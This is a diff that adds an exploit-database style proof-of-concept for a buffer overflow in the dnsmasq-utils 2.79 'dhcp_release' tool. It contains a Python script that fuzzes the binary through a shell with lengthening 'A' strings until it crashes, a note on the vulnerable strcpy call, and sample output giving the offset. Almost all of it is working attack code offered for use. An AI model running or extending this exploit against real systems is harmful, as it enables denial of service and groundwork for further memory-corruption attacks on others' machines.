@@ -1,0 +1,38 @@
+# Exploit Title: dnsmasq-utils 2.79-1 - 'dhcp_release' Denial of Service (PoC)
+# Date: 2020-04-06
+# Exploit Author: Josue Encinar
+# Software Link: https://launchpad.net/ubuntu/+source/dnsmasq/2.79-1
+# Version: 2.79 
+# Tested on: Ubuntu 18.04
+
+
+from subprocess import Popen, PIPE
+
+data = ""
+bof = False
+for i in range (1, 200):
+    A = "A"*i
+    data = f"dhcp_release {A} 1 1"
+    try:
+        result = Popen(data, stdout=PIPE, stderr=PIPE, shell=True)
+        error = result.stderr.read().decode()
+        if "Aborted (core dumped)" in error:
+            print("[+] Buffer Overflow detected!")
+            print(f"[*] Offset: {i}")
+            bof = True
+            break
+    except Exception as e:
+        print(f"[-] {e}")
+
+if not bof:
+    print("[-] No buffer overflow...")
+
+
+## Check line 273 in dhcp_release.c 
+### strcpy(ifr.ifr_name, argv[1]);
+#
+## PoC:
+# josue@ubuntu:~/Escritorio/bof_dhcp$ python3 dhcp_release_bof.py 
+# *** buffer overflow detected ***: dhcp_release terminated
+# [+] Buffer Overflow detected!
+# [*] Offset: 16
